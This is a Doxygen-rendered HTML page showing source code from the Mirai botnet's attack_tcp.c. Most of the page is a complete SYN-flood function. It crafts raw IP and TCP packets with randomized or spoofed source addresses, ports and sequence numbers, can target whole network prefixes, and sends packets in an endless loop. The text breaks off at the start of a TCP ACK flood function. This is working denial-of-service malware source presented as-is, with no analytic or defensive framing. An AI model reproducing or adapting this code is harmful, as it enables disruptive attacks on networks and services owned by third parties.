<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/xhtml;charset=UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=9"/>
<meta name="generator" content="Doxygen 1.8.11"/>
<title>Mirai: mirai/bot/attack_tcp.c Source File</title>
<link href="tabs.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="jquery.js"></script>
<script type="text/javascript" src="dynsections.js"></script>
<link href="navtree.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="resize.js"></script>
<script type="text/javascript" src="navtreedata.js"></script>
<script type="text/javascript" src="navtree.js"></script>
<script type="text/javascript">
  $(document).ready(initResizable);
  $(window).load(resizeHeight);
</script>
<link href="search/search.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="search/searchdata.js"></script>
<script type="text/javascript" src="search/search.js"></script>
<script type="text/javascript">
  $(document).ready(function() { init_search(); });
</script>
<link href="doxygen.css" rel="stylesheet" type="text/css" />
</head>
<body>
<div id="top"><!-- do not remove this div, it is closed by doxygen! -->
<div id="titlearea">
<table cellspacing="0" cellpadding="0">
 <tbody>
 <tr style="height: 56px;">
  <td id="projectalign" style="padding-left: 0.5em;">
   <div id="projectname">Mirai
   </div>
  </td>
 </tr>
 </tbody>
</table>
</div>
<!-- end header part -->
<!-- Generated by Doxygen 1.8.11 -->
<script type="text/javascript">
var searchBox = new SearchBox("searchBox", "search",false,'Search');
</script>
  <div id="navrow1" class="tabs">
    <ul class="tablist">
      <li><a href="index.html"><span>Main&#160;Page</span></a></li>
      <li><a href="pages.html"><span>Related&#160;Pages</span></a></li>
      <li><a href="annotated.html"><span>Data&#160;Structures</span></a></li>
      <li class="current"><a href="files.html"><span>Files</span></a></li>
      <li>
        <div id="MSearchBox" class="MSearchBoxInactive">
        <span class="left">
          <img id="MSearchSelect" src="search/mag_sel.png"
               onmouseover="return searchBox.OnSearchSelectShow()"
               onmouseout="return searchBox.OnSearchSelectHide()"
               alt=""/>
          <input type="text" id="MSearchField" value="Search" accesskey="S"
               onfocus="searchBox.OnSearchFieldFocus(true)" 
               onblur="searchBox.OnSearchFieldFocus(false)" 
               onkeyup="searchBox.OnSearchFieldChange(event)"/>
          </span><span class="right">
            <a id="MSearchClose" href="javascript:searchBox.CloseResultsWindow()"><img id="MSearchCloseImg" border="0" src="search/close.png" alt=""/></a>
          </span>
        </div>
      </li>
    </ul>
  </div>
  <div id="navrow2" class="tabs2">
    <ul class="tablist">
      <li><a href="files.html"><span>File&#160;List</span></a></li>
      <li><a href="globals.html"><span>Globals</span></a></li>
    </ul>
  </div>
</div><!-- top -->
<div id="side-nav" class="ui-resizable side-nav-resizable">
  <div id="nav-tree">
    <div id="nav-tree-contents">
      <div id="nav-sync" class="sync"></div>
    </div>
  </div>
  <div id="splitbar" style="-moz-user-select:none;" 
       class="ui-resizable-handle">
  </div>
</div>
<script type="text/javascript">
$(document).ready(function(){initNavTree('attack__tcp_8c_source.html','');});
</script>
<div id="doc-content">
<!-- window showing the filter options -->
<div id="MSearchSelectWindow"
     onmouseover="return searchBox.OnSearchSelectShow()"
     onmouseout="return searchBox.OnSearchSelectHide()"
     onkeydown="return searchBox.OnSearchSelectKey(event)">
</div>

<!-- iframe showing the search results (closed by default) -->
<div id="MSearchResultsWindow">
<iframe src="javascript:void(0)" frameborder="0" 
        name="MSearchResults" id="MSearchResults">
</iframe>
</div>

<div class="header">
  <div class="headertitle">
<div class="title">attack_tcp.c</div>  </div>
</div><!--header-->
<div class="contents">
<a href="attack__tcp_8c.html">Go to the documentation of this file.</a><div class="fragment"><div class="line"><a name="l00001"></a><span class="lineno"><a class="line" href="attack__tcp_8c.html#a369266c24eacffb87046522897a570d5">    1</a></span>&#160;<span class="preprocessor">#define _GNU_SOURCE</span></div><div class="line"><a name="l00002"></a><span class="lineno">    2</span>&#160;</div><div class="line"><a name="l00003"></a><span class="lineno">    3</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00004"></a><span class="lineno">    4</span>&#160;<span class="preprocessor">#include &lt;stdio.h&gt;</span></div><div class="line"><a name="l00005"></a><span class="lineno">    5</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00006"></a><span class="lineno">    6</span>&#160;<span class="preprocessor">#include &lt;stdlib.h&gt;</span></div><div class="line"><a name="l00007"></a><span class="lineno">    7</span>&#160;<span class="preprocessor">#include &lt;unistd.h&gt;</span></div><div class="line"><a name="l00008"></a><span class="lineno">    8</span>&#160;<span class="preprocessor">#include &lt;sys/socket.h&gt;</span></div><div class="line"><a name="l00009"></a><span class="lineno">    9</span>&#160;<span class="preprocessor">#include &lt;linux/ip.h&gt;</span></div><div class="line"><a name="l00010"></a><span class="lineno">   10</span>&#160;<span class="preprocessor">#include &lt;linux/tcp.h&gt;</span></div><div class="line"><a name="l00011"></a><span class="lineno">   11</span>&#160;<span class="preprocessor">#include &lt;fcntl.h&gt;</span></div><div class="line"><a name="l00012"></a><span class="lineno">   12</span>&#160;<span class="preprocessor">#include &lt;errno.h&gt;</span></div><div class="line"><a name="l00013"></a><span class="lineno">   13</span>&#160;<span class="preprocessor">#include &quot;<a class="code" href="mirai_2bot_2includes_8h.html">includes.h</a>&quot;</span></div><div class="line"><a name="l00014"></a><span class="lineno">   14</span>&#160;<span class="preprocessor">#include &quot;<a class="code" href="attack_8h.html">attack.h</a>&quot;</span></div><div class="line"><a name="l00015"></a><span class="lineno">   15</span>&#160;<span class="preprocessor">#include &quot;<a class="code" href="checksum_8h.html">checksum.h</a>&quot;</span></div><div class="line"><a name="l00016"></a><span class="lineno">   16</span>&#160;<span class="preprocessor">#include &quot;<a class="code" href="rand_8h.html">rand.h</a>&quot;</span></div><div class="line"><a name="l00017"></a><span class="lineno">   17</span>&#160;</div><div class="line"><a name="l00018"></a><span class="lineno"><a class="line" href="attack__tcp_8c.html#ae8f0b5db75e6158068cb8cbb2b79cf70">   18</a></span>&#160;<span class="keywordtype">void</span> <a class="code" href="attack__tcp_8c.html#ae8f0b5db75e6158068cb8cbb2b79cf70">attack_tcp_syn</a>(uint8_t targs_len, <span class="keyword">struct</span> <a class="code" href="structattack__target.html">attack_target</a> *targs, uint8_t opts_len, <span class="keyword">struct</span> <a class="code" href="structattack__option.html">attack_option</a> *opts)</div><div class="line"><a name="l00019"></a><span class="lineno">   19</span>&#160;{</div><div class="line"><a name="l00020"></a><span class="lineno">   20</span>&#160;    <span class="keywordtype">int</span> i, fd;</div><div class="line"><a name="l00021"></a><span class="lineno">   21</span>&#160;    <span class="keywordtype">char</span> **pkts = calloc(targs_len, <span class="keyword">sizeof</span> (<span class="keywordtype">char</span> *));</div><div class="line"><a name="l00022"></a><span class="lineno">   22</span>&#160;    uint8_t ip_tos = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a1ac4210e00c74506c31642a74e3fc1c7">ATK_OPT_IP_TOS</a>, 0);</div><div class="line"><a name="l00023"></a><span class="lineno">   23</span>&#160;    uint16_t ip_ident = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#aecb175215ca3d0ce5017cd8cedb7e0fe">ATK_OPT_IP_IDENT</a>, 0xffff);</div><div class="line"><a name="l00024"></a><span class="lineno">   24</span>&#160;    uint8_t ip_ttl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#acfa2ed8a557040aed04b6c9346aa0eb9">ATK_OPT_IP_TTL</a>, 64);</div><div class="line"><a name="l00025"></a><span class="lineno">   25</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> dont_frag = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a57162ecbd3f7644a8f6a6b58aa4f8596">ATK_OPT_IP_DF</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>);</div><div class="line"><a name="l00026"></a><span class="lineno">   26</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> sport = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a4d0115976f56267c42e6a09ff3651c02">ATK_OPT_SPORT</a>, 0xffff);</div><div class="line"><a name="l00027"></a><span class="lineno">   27</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> dport = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a>, 0xffff);</div><div class="line"><a name="l00028"></a><span class="lineno">   28</span>&#160;    uint32_t seq = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a97b7c19adba8f5e25d603d4fcd80c995">ATK_OPT_SEQRND</a>, 0xffff);</div><div class="line"><a name="l00029"></a><span class="lineno">   29</span>&#160;    uint32_t ack = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a0fcd18d4c1705cc62b8a2d3f92e0a780">ATK_OPT_ACKRND</a>, 0);</div><div class="line"><a name="l00030"></a><span class="lineno">   30</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> urg_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a5a6f282c43f088516dce2de1b69ae7d8">ATK_OPT_URG</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00031"></a><span class="lineno">   31</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> ack_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a61c202b303f42c57328c999b1104877d">ATK_OPT_ACK</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00032"></a><span class="lineno">   32</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> psh_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a5ae76926414352bb8e12896c5581a0fd">ATK_OPT_PSH</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00033"></a><span class="lineno">   33</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> rst_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a4464ea34ef73875f57b5c6a412aaac20">ATK_OPT_RST</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00034"></a><span class="lineno">   34</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> syn_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a4f086d53d4494633a898fbd9886b08bf">ATK_OPT_SYN</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>);</div><div class="line"><a name="l00035"></a><span class="lineno">   35</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> fin_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a2ad2949e3a473ebba047e474abf5d461">ATK_OPT_FIN</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00036"></a><span class="lineno">   36</span>&#160;    uint32_t source_ip = <a class="code" href="attack_8c.html#a51262dda96f2861dbd13fc0b6f0a31d3">attack_get_opt_ip</a>(opts_len, opts, <a class="code" href="attack_8h.html#a9b14feb6720fefac0c6da63a77da718e">ATK_OPT_SOURCE</a>, <a class="code" href="mirai_2bot_2includes_8h.html#aecb64c7238a325af454cf5e17d933ff2">LOCAL_ADDR</a>);</div><div class="line"><a name="l00037"></a><span class="lineno">   37</span>&#160;</div><div class="line"><a name="l00038"></a><span class="lineno">   38</span>&#160;    <span class="keywordflow">if</span> ((fd = <a class="code" href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a>(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)</div><div class="line"><a name="l00039"></a><span class="lineno">   39</span>&#160;    {</div><div class="line"><a name="l00040"></a><span class="lineno">   40</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00041"></a><span class="lineno">   41</span>&#160;        printf(<span class="stringliteral">&quot;Failed to create raw socket. Aborting attack\n&quot;</span>);</div><div class="line"><a name="l00042"></a><span class="lineno">   42</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00043"></a><span class="lineno">   43</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00044"></a><span class="lineno">   44</span>&#160;    }</div><div class="line"><a name="l00045"></a><span class="lineno">   45</span>&#160;    </div><div class="line"><a name="l00046"></a><span class="lineno">   46</span>&#160;    i = 1;</div><div class="line"><a name="l00047"></a><span class="lineno">   47</span>&#160;    <span class="keywordflow">if</span> (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &amp;i, <span class="keyword">sizeof</span> (<span class="keywordtype">int</span>)) == -1)</div><div class="line"><a name="l00048"></a><span class="lineno">   48</span>&#160;    {</div><div class="line"><a name="l00049"></a><span class="lineno">   49</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00050"></a><span class="lineno">   50</span>&#160;        printf(<span class="stringliteral">&quot;Failed to set IP_HDRINCL. Aborting\n&quot;</span>);</div><div class="line"><a name="l00051"></a><span class="lineno">   51</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00052"></a><span class="lineno">   52</span>&#160;        <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(fd);</div><div class="line"><a name="l00053"></a><span class="lineno">   53</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00054"></a><span class="lineno">   54</span>&#160;    }</div><div class="line"><a name="l00055"></a><span class="lineno">   55</span>&#160;</div><div class="line"><a name="l00056"></a><span class="lineno">   56</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00057"></a><span class="lineno">   57</span>&#160;    {</div><div class="line"><a name="l00058"></a><span class="lineno">   58</span>&#160;        <span class="keyword">struct </span>iphdr *iph;</div><div class="line"><a name="l00059"></a><span class="lineno">   59</span>&#160;        <span class="keyword">struct </span>tcphdr *tcph;</div><div class="line"><a name="l00060"></a><span class="lineno">   60</span>&#160;        uint8_t *opts;</div><div class="line"><a name="l00061"></a><span class="lineno">   61</span>&#160;</div><div class="line"><a name="l00062"></a><span class="lineno">   62</span>&#160;        pkts[i] = calloc(128, <span class="keyword">sizeof</span> (<span class="keywordtype">char</span>));</div><div class="line"><a name="l00063"></a><span class="lineno">   63</span>&#160;        iph = (<span class="keyword">struct </span>iphdr *)pkts[i];</div><div class="line"><a name="l00064"></a><span class="lineno">   64</span>&#160;        tcph = (<span class="keyword">struct </span>tcphdr *)(iph + 1);</div><div class="line"><a name="l00065"></a><span class="lineno">   65</span>&#160;        opts = (uint8_t *)(tcph + 1);</div><div class="line"><a name="l00066"></a><span class="lineno">   66</span>&#160;</div><div class="line"><a name="l00067"></a><span class="lineno">   67</span>&#160;        iph-&gt;version = 4;</div><div class="line"><a name="l00068"></a><span class="lineno">   68</span>&#160;        iph-&gt;ihl = 5;</div><div class="line"><a name="l00069"></a><span class="lineno">   69</span>&#160;        iph-&gt;tos = ip_tos;</div><div class="line"><a name="l00070"></a><span class="lineno">   70</span>&#160;        iph-&gt;tot_len = htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + 20);</div><div class="line"><a name="l00071"></a><span class="lineno">   71</span>&#160;        iph-&gt;id = htons(ip_ident);</div><div class="line"><a name="l00072"></a><span class="lineno">   72</span>&#160;        iph-&gt;ttl = ip_ttl;</div><div class="line"><a name="l00073"></a><span class="lineno">   73</span>&#160;        <span class="keywordflow">if</span> (dont_frag)</div><div class="line"><a name="l00074"></a><span class="lineno">   74</span>&#160;            iph-&gt;frag_off = htons(1 &lt;&lt; 14);</div><div class="line"><a name="l00075"></a><span class="lineno">   75</span>&#160;        iph-&gt;protocol = IPPROTO_TCP;</div><div class="line"><a name="l00076"></a><span class="lineno">   76</span>&#160;        iph-&gt;saddr = source_ip;</div><div class="line"><a name="l00077"></a><span class="lineno">   77</span>&#160;        iph-&gt;daddr = targs[i].<a class="code" href="structattack__target.html#a431d4eed6dd4e7faddf9b8615b4d5c2a">addr</a>;</div><div class="line"><a name="l00078"></a><span class="lineno">   78</span>&#160;</div><div class="line"><a name="l00079"></a><span class="lineno">   79</span>&#160;        tcph-&gt;source = htons(sport);</div><div class="line"><a name="l00080"></a><span class="lineno">   80</span>&#160;        tcph-&gt;dest = htons(dport);</div><div class="line"><a name="l00081"></a><span class="lineno">   81</span>&#160;        tcph-&gt;seq = htons(seq);</div><div class="line"><a name="l00082"></a><span class="lineno">   82</span>&#160;        tcph-&gt;doff = 10;</div><div class="line"><a name="l00083"></a><span class="lineno">   83</span>&#160;        tcph-&gt;urg = urg_fl;</div><div class="line"><a name="l00084"></a><span class="lineno">   84</span>&#160;        tcph-&gt;ack = ack_fl;</div><div class="line"><a name="l00085"></a><span class="lineno">   85</span>&#160;        tcph-&gt;psh = psh_fl;</div><div class="line"><a name="l00086"></a><span class="lineno">   86</span>&#160;        tcph-&gt;rst = rst_fl;</div><div class="line"><a name="l00087"></a><span class="lineno">   87</span>&#160;        tcph-&gt;syn = syn_fl;</div><div class="line"><a name="l00088"></a><span class="lineno">   88</span>&#160;        tcph-&gt;fin = fin_fl;</div><div class="line"><a name="l00089"></a><span class="lineno">   89</span>&#160;</div><div class="line"><a name="l00090"></a><span class="lineno">   90</span>&#160;        <span class="comment">// TCP MSS</span></div><div class="line"><a name="l00091"></a><span class="lineno">   91</span>&#160;        *opts++ = <a class="code" href="protocol_8h.html#a0ac41cedcfd51c915345550521966281">PROTO_TCP_OPT_MSS</a>;    <span class="comment">// Kind</span></div><div class="line"><a name="l00092"></a><span class="lineno">   92</span>&#160;        *opts++ = 4;                    <span class="comment">// Length</span></div><div class="line"><a name="l00093"></a><span class="lineno">   93</span>&#160;        *((uint16_t *)opts) = htons(1400 + (<a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0x0f));</div><div class="line"><a name="l00094"></a><span class="lineno">   94</span>&#160;        opts += <span class="keyword">sizeof</span> (uint16_t);</div><div class="line"><a name="l00095"></a><span class="lineno">   95</span>&#160;</div><div class="line"><a name="l00096"></a><span class="lineno">   96</span>&#160;        <span class="comment">// TCP SACK permitted</span></div><div class="line"><a name="l00097"></a><span class="lineno">   97</span>&#160;        *opts++ = <a class="code" href="protocol_8h.html#a7685648be6843dc7a65440e8696044d1">PROTO_TCP_OPT_SACK</a>;</div><div class="line"><a name="l00098"></a><span class="lineno">   98</span>&#160;        *opts++ = 2;</div><div class="line"><a name="l00099"></a><span class="lineno">   99</span>&#160;</div><div class="line"><a name="l00100"></a><span class="lineno">  100</span>&#160;        <span class="comment">// TCP timestamps</span></div><div class="line"><a name="l00101"></a><span class="lineno">  101</span>&#160;        *opts++ = <a class="code" href="protocol_8h.html#a8922d59dda5c9af3f4d0dd3ac311846d">PROTO_TCP_OPT_TSVAL</a>;</div><div class="line"><a name="l00102"></a><span class="lineno">  102</span>&#160;        *opts++ = 10;</div><div class="line"><a name="l00103"></a><span class="lineno">  103</span>&#160;        *((uint32_t *)opts) = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00104"></a><span class="lineno">  104</span>&#160;        opts += <span class="keyword">sizeof</span> (uint32_t);</div><div class="line"><a name="l00105"></a><span class="lineno">  105</span>&#160;        *((uint32_t *)opts) = 0;</div><div class="line"><a name="l00106"></a><span class="lineno">  106</span>&#160;        opts += <span class="keyword">sizeof</span> (uint32_t);</div><div class="line"><a name="l00107"></a><span class="lineno">  107</span>&#160;</div><div class="line"><a name="l00108"></a><span class="lineno">  108</span>&#160;        <span class="comment">// TCP nop</span></div><div class="line"><a name="l00109"></a><span class="lineno">  109</span>&#160;        *opts++ = 1;</div><div class="line"><a name="l00110"></a><span class="lineno">  110</span>&#160;</div><div class="line"><a name="l00111"></a><span class="lineno">  111</span>&#160;        <span class="comment">// TCP window scale</span></div><div class="line"><a name="l00112"></a><span class="lineno">  112</span>&#160;        *opts++ = <a class="code" href="protocol_8h.html#af4ea7ee9b6b8b13a589a2276719c1ea6">PROTO_TCP_OPT_WSS</a>;</div><div class="line"><a name="l00113"></a><span class="lineno">  113</span>&#160;        *opts++ = 3;</div><div class="line"><a name="l00114"></a><span class="lineno">  114</span>&#160;        *opts++ = 6; <span class="comment">// 2^6 = 64, window size scale = 64</span></div><div class="line"><a name="l00115"></a><span class="lineno">  115</span>&#160;    }</div><div class="line"><a name="l00116"></a><span class="lineno">  116</span>&#160;</div><div class="line"><a name="l00117"></a><span class="lineno">  117</span>&#160;    <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00118"></a><span class="lineno">  118</span>&#160;    {</div><div class="line"><a name="l00119"></a><span class="lineno">  119</span>&#160;        <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00120"></a><span class="lineno">  120</span>&#160;        {</div><div class="line"><a name="l00121"></a><span class="lineno">  121</span>&#160;            <span class="keywordtype">char</span> *pkt = pkts[i];</div><div class="line"><a name="l00122"></a><span class="lineno">  122</span>&#160;            <span class="keyword">struct </span>iphdr *iph = (<span class="keyword">struct </span>iphdr *)pkt;</div><div class="line"><a name="l00123"></a><span class="lineno">  123</span>&#160;            <span class="keyword">struct </span>tcphdr *tcph = (<span class="keyword">struct </span>tcphdr *)(iph + 1);</div><div class="line"><a name="l00124"></a><span class="lineno">  124</span>&#160;            </div><div class="line"><a name="l00125"></a><span class="lineno">  125</span>&#160;            <span class="comment">// For prefix attacks</span></div><div class="line"><a name="l00126"></a><span class="lineno">  126</span>&#160;            <span class="keywordflow">if</span> (targs[i].netmask &lt; 32)</div><div class="line"><a name="l00127"></a><span class="lineno">  127</span>&#160;                iph-&gt;daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)<a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>()) &gt;&gt; targs[i].netmask));</div><div class="line"><a name="l00128"></a><span class="lineno">  128</span>&#160;</div><div class="line"><a name="l00129"></a><span class="lineno">  129</span>&#160;            <span class="keywordflow">if</span> (source_ip == 0xffffffff)</div><div class="line"><a name="l00130"></a><span class="lineno">  130</span>&#160;                iph-&gt;saddr = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00131"></a><span class="lineno">  131</span>&#160;            <span class="keywordflow">if</span> (ip_ident == 0xffff)</div><div class="line"><a name="l00132"></a><span class="lineno">  132</span>&#160;                iph-&gt;id = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00133"></a><span class="lineno">  133</span>&#160;            <span class="keywordflow">if</span> (sport == 0xffff)</div><div class="line"><a name="l00134"></a><span class="lineno">  134</span>&#160;                tcph-&gt;source = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00135"></a><span class="lineno">  135</span>&#160;            <span class="keywordflow">if</span> (dport == 0xffff)</div><div class="line"><a name="l00136"></a><span class="lineno">  136</span>&#160;                tcph-&gt;dest = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00137"></a><span class="lineno">  137</span>&#160;            <span class="keywordflow">if</span> (seq == 0xffff)</div><div class="line"><a name="l00138"></a><span class="lineno">  138</span>&#160;                tcph-&gt;seq = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00139"></a><span class="lineno">  139</span>&#160;            <span class="keywordflow">if</span> (ack == 0xffff)</div><div class="line"><a name="l00140"></a><span class="lineno">  140</span>&#160;                tcph-&gt;ack_seq = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00141"></a><span class="lineno">  141</span>&#160;            <span class="keywordflow">if</span> (urg_fl)</div><div class="line"><a name="l00142"></a><span class="lineno">  142</span>&#160;                tcph-&gt;urg_ptr = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00143"></a><span class="lineno">  143</span>&#160;</div><div class="line"><a name="l00144"></a><span class="lineno">  144</span>&#160;            iph-&gt;check = 0;</div><div class="line"><a name="l00145"></a><span class="lineno">  145</span>&#160;            iph-&gt;check = <a class="code" href="checksum_8c.html#a84522f5e663ea711a5ceafdf03e586ea">checksum_generic</a>((uint16_t *)iph, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr));</div><div class="line"><a name="l00146"></a><span class="lineno">  146</span>&#160;</div><div class="line"><a name="l00147"></a><span class="lineno">  147</span>&#160;            tcph-&gt;check = 0;</div><div class="line"><a name="l00148"></a><span class="lineno">  148</span>&#160;            tcph-&gt;check = <a class="code" href="checksum_8c.html#a5144ab59500e01ed196ae6d8b4584c98">checksum_tcpudp</a>(iph, tcph, htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + 20), <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + 20);</div><div class="line"><a name="l00149"></a><span class="lineno">  149</span>&#160;</div><div class="line"><a name="l00150"></a><span class="lineno">  150</span>&#160;            targs[i].<a class="code" href="structattack__target.html#a8f537c8c1aa7f2b611c6de392d964dfc">sock_addr</a>.sin_port = tcph-&gt;dest;</div><div class="line"><a name="l00151"></a><span class="lineno">  151</span>&#160;            sendto(fd, pkt, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + 20, MSG_NOSIGNAL, (<span class="keyword">struct</span> sockaddr *)&amp;targs[i].sock_addr, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> sockaddr_in));</div><div class="line"><a name="l00152"></a><span class="lineno">  152</span>&#160;        }</div><div class="line"><a name="l00153"></a><span class="lineno">  153</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00154"></a><span class="lineno">  154</span>&#160;            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00155"></a><span class="lineno">  155</span>&#160;            <span class="keywordflow">if</span> (errno != 0)</div><div class="line"><a name="l00156"></a><span class="lineno">  156</span>&#160;                printf(<span class="stringliteral">&quot;errno = %d\n&quot;</span>, errno);</div><div class="line"><a name="l00157"></a><span class="lineno">  157</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00158"></a><span class="lineno">  158</span>&#160;    }</div><div class="line"><a name="l00159"></a><span class="lineno">  159</span>&#160;}</div><div class="line"><a name="l00160"></a><span class="lineno">  160</span>&#160;</div><div class="line"><a name="l00161"></a><span class="lineno"><a class="line" href="attack__tcp_8c.html#a1195433a4eb190cddc7d0b7643bb3a9b">  161</a></span>&#160;<span class="keywordtype">void</span> <a class="code" href="attack__tcp_8c.html#a1195433a4eb190cddc7d0b7643bb3a9b">attack_tcp_ack</a>(uint8_t targs_len, <span class="keyword">struct</span> <a class="code" href="structattack__target.html">attack_target</a> *targs, uint8_t 